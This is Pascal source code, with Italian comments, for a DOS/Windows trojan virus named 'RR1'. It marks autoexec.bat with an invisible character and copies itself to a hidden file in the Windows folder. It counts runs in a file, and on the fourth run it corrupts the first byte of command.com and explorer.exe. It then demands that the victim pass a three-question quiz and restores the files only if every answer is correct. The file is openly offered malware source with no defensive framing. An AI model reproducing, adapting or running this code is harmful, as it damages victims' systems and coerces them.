{RR1: trojan horse-virus by RaggedRobin}

program rr1;
uses DOS,CRT;
type conta=file of integer;
type autoexec=file of char;
var i,copy,risp2,invio:char;
    auto,zone,gruppo,command,explorer:autoexec;
    volte:conta;
    harddisk:string;
    dischetto:string;
    j,contatore:integer;
    risp:string;

procedure fallito;
begin
 write('SPIACENTE AMICO QUESTA VOLTA TI E" ANDATA MALE !!!');
 delay(2000);
 HALT;
END;

begin
 invio:=chr(13);
 j:=0;
 i:=chr(255);                           {il carattere ASCII 255 Š invisibile}
 assign(auto,'c:\autoexec.bat');
 reset(auto);
 assign(volte,'c:\windows\group.txt');
 repeat
  read(auto,copy); if copy=i then j:=1;
 until (eof(auto)) or (j=1);               {guardo se autoexec.bat Š infetto}
 if j<>1 then begin                         {se non lo Š}
               seek(auto,filesize(auto));
               write(auto,invio);           {aggiungo un invio}
               invio:=char(10);
               write(auto,invio);
               write(auto,i);               {e il carattere 255}
               close(auto);                 {nell'autoexec.bat}
               harddisk:='c:\windows\.exe'; {copio il virus su hd}
               dischetto:='.exe';
               insert(i,harddisk,12);       {inserisce i in harddisk}
               insert(i,dischetto,1);       {inserisce i in dischetto}
               assign(zone,dischetto);
               assign(gruppo,harddisk);
               reset(zone);
               rewrite(gruppo);
               repeat
                read(zone,copy); write(gruppo,copy);
               until eof(zone); close (zone); close(gruppo);
               rewrite(volte);              {creo il contatore}
               write(volte,j);
               close(volte);
               SetFAttr(gruppo,Hidden);     {nascondo il file virus}
              end;
 reset(volte);
 read(volte,contatore);        {legge il contatore}
 reset(volte);
 contatore:=contatore+1;       {lo incrementa}
 write(volte,contatore);       {e lo riscrive}
 close(volte);
 reset(volte);
 read(volte,contatore);
 if contatore=4 then begin                       {contatore=4 --> crack}
                      assign(command,'c:\command.com');
                      assign(explorer,'c:\windows\explorer.exe');
                      reset(command);
                      reset(explorer);
                      read(explorer,copy);
                      copy:=char(ord(copy)+2);   {aggiungo 2 al primo }
                      reset(explorer);
                      write(explorer,copy);      {carattere di        }
                      read(command,copy);        {command.com ed      }
                      copy:=char(ord(copy)+2);   {explorer.exe        }
                      reset(command);
                      write(command,copy);
                      close(command);
                      close(explorer);
                      {QUESTO QUA' SOTTO Š L'AVVISO}
                      CLRSCR;
                      WRITELN('SPIACENTE AMICO, TI SEI BECCATO UN VIRUS.');
                      WRITELN('FOSSI IN TE NON SPEGNEREI IL COMPUTER.');
                      GOTOXY(1,5);
                      WRITELN('SE RISPONDI ALLE MIE DOMANDE CANCELLERO" IL VIRUS');
                      WRITELN('SE NON LO FARAI...PEGGIO PER TE');
                      WRITE('PREMI UN TASTO PER INCOMINCIARE E RICORDATI CHE NON PUOI');
                      WRITELN('SBAGLIARE');
                      DELAY(2500);               {ritarda qualche secondo}
                      READKEY;                   {per evitare che uno prema}
                      CLRSCR;                    {un tasto per sbaglio }
                      {QUESTO INVECE Š L'HACK QUIZ}
                      REPEAT
                       WRITELN('Qual" Š il nome di Mitnick?');
                       READLN(RISP);
                       WRITELN('NE SEI PROPRIO SICURO?(S/N)');
                       READLN(RISP2);
                      UNTIL (RISP2='S') OR (RISP2='s');
                      IF (RISP='Kevin') OR (risp='KEVIN') OR (RISP='kevin')
                       THEN BEGIN
                             WRITELN('PRIMA RISPOSTA GIUSTA!');
                             CLRSCR;
                             DELAY(1500);
                            END
                      ELSE FALLITO;
                      WRITELN('');
                      REPEAT
                       WRITELN('Qual" Š il sistema operativo pi— usato nelle reti?');
                       READLN(RISP);
                       WRITELN('NE SEI PROPRIO SICURO?(S/N)');
                       READLN(RISP2);
                      UNTIL (RISP2='S') OR (RISP2='s');
                      IF (RISP='Unix') OR (risp='UNIX') OR (RISP='unix')
                       THEN BEGIN
                             WRITELN('HAI AZZECCATO ANCHE LA SECONDA, COMPLIMENTI.');
                             CLRSCR;
                             DELAY(1500);
                            END
                      ELSE FALLITO;
                      WRITELN('');
                      REPEAT
                       WRITELN('IL SISTEMA OPERATIVO DA LA PRECEDENZA AI COM O AGLI EXE?');
                       READLN(RISP);
                       WRITELN('NE SEI PROPRIO SICURO?(S/N)');
                       READLN(RISP2);
                      UNTIL (RISP2='S') OR (RISP2='s');
                      IF (RISP='COM') OR (risp='Com') OR (RISP='com')
                       THEN BEGIN
                             WRITELN('E ANCHE LA TERZA E" GIUSTA, ORA TOGLIERO" IL VIRUS');
                             CLRSCR;
                             DELAY(1500);
                            END
                      ELSE FALLITO;
{CON QUESTO METTO TUTTO A POSTO}
                      reset(command);
                      reset(explorer);
                      read(explorer,copy);
                      copy:=char(ord(copy)-2);       {tolgo 2 al primo }
                      reset(explorer);               {carattere di     }
                      write(explorer,copy);          {command.com ed   }
                      read(command,copy);            {explorer.exe     }
                      copy:=char(ord(copy)-2);
                      reset(command);
                      write(command,copy);
                      close(command);
                      close(explorer);
                     end;
end.